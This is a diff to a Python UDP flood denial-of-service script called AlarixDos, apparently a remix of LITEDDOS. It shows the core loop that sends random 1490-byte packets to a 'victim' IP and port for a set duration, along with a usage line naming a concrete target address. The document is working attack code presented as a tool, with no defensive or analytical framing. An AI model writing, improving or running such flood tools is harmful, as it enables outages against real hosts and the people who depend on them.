@@ -10,9 +10,10 @@ def usage():
            _            _      _____            
      /\   | |          (_)    |  __ \           
     /  \  | | __ _ _ __ ___  _| |  | | ___  ___  
-   / /\ \ | |/ _` | '__| \ \/ / |  | |/ _ \/ __| 
-  / ____ \| | (_| | |  | |>  <| |__| | (_) \__ \ 
- /_/    \_\_|\__,_|_|  |_/_/\_\_____/ \___/|___/ 
+   / /\ \ | |/ _` | '__| \ \/ / |  | |/ _ \/ __|Forked
+  / ____ \| | (_| | |  | |>  <| |__| | (_) \__ \From
+ /_/    \_\_|\__,_|_|  |_/_/\_\_____/ \___/|___/LITEDDOS
+    [V2] AlarixDos - LITEDDOS + Modification = OP
     By AlarixDev | LITEDDOS remix | 4L13199 | Do not sell.                                    
     Example: python alarixdos.py 104.27.190.77 8080 100                                   
 \n""")
@@ -22,9 +23,9 @@ def flood(victim, vport, duration):
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
-    bytes = random._urandom(20000)
+    bytes = random._urandom(1490)
     timeout =  time.time() + duration
-    sent = 3000
+    sent = 0
 
     while 1:
         if time.time() > timeout:
@@ -33,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print(Fore.GREEN + "Sending packet...")
+        print(Fore.GREEN + "[AlarixDos] Sending packet...")
 def main():
     print(len(sys.argv))
     if len(sys.argv) != 4:
